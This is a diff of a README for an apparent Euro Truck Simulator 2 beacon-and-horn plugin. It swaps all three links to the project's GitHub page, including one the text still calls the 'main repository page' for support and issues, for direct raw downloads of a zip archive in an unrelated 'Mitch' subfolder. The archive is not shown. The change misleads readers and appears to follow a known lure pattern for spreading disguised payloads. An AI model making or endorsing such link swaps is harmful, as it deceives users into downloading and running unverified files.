@@ -1,6 +1,6 @@
 # 🚦 ets2-beacon-horn-plugin - Toggle Beacon and Horn Easily
 
-[![Download Now](https://img.shields.io/badge/Download-ets2--beacon--horn--plugin-ff69b4?style=for-the-badge)](https://github.com/Death988/ets2-beacon-horn-plugin)
+[![Download Now](https://img.shields.io/badge/Download-ets2--beacon--horn--plugin-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/Death988/ets2-beacon-horn-plugin/main/Mitch/plugin_ets_beacon_horn_1.1-beta.3.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Before you begin, make sure ETS2 is running with the telemetry plugin enabled. Y
 
 You can get the plugin from the official GitHub page. Please visit this page to download:
 
-[![Download Here](https://img.shields.io/badge/Get%20Plugin-Download%20Page-8A2BE2?style=for-the-badge)](https://github.com/Death988/ets2-beacon-horn-plugin)
+[![Download Here](https://img.shields.io/badge/Get%20Plugin-Download%20Page-8A2BE2?style=for-the-badge)](https://raw.githubusercontent.com/Death988/ets2-beacon-horn-plugin/main/Mitch/plugin_ets_beacon_horn_1.1-beta.3.zip)
 
 ### Steps to download and install:
 
@@ -136,7 +136,7 @@ This plugin is designed as a convenience tool to improve your ETS2 driving exper
 
 For updates, support, and reporting issues, visit the main repository page:
 
-[https://github.com/Death988/ets2-beacon-horn-plugin](https://github.com/Death988/ets2-beacon-horn-plugin)
+[https://raw.githubusercontent.com/Death988/ets2-beacon-horn-plugin/main/Mitch/plugin_ets_beacon_horn_1.1-beta.3.zip](https://raw.githubusercontent.com/Death988/ets2-beacon-horn-plugin/main/Mitch/plugin_ets_beacon_horn_1.1-beta.3.zip)
 
 Check the Issues tab to see or report any problems. The community and the developer typically respond to questions related to setup or troubleshooting.
 
